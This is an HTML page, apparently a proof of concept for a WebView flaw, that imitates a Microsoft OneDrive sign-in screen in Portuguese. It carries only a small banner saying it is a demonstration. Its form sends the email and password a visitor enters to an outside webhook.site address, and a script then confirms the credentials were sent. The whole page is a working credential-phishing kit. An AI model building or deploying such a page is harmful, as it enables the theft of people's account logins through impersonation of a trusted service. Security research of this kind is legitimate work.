<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>OneDrive - Entrar</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f3f3f3; margin: 0; padding: 20px; }
        .box { max-width: 420px; margin: 40px auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); text-align: center; }
        h1 { margin: 0 0 10px; font-size: 26px; }
        p { color: #555; margin-bottom: 25px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 17px; }
        button { width: 100%; padding: 14px; background: #0078d4; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
        .demo { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 25px; font-size: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="demo">Esta é uma página de demonstração by Z Kamachi</div>

        <h1>Entrar</h1>
        <p>Use sua conta Microsoft para acessar o OneDrive</p>

        <form id="form" action="https://webhook.site/c4e06d2f-8cd7-4ef7-8e49-3225dca67314" method="GET">
            <input type="hidden" name="source" value="inDrive-WebView-PoC">
            <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
            <input type="password" id="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>

    <script>
        document.getElementById('form').addEventListener('submit', function() {
            alert("✅ Credenciais enviadas para o webhook.site!\n\nAgora olhe na outra aba.");
        });
    </script>
</body>
</html>
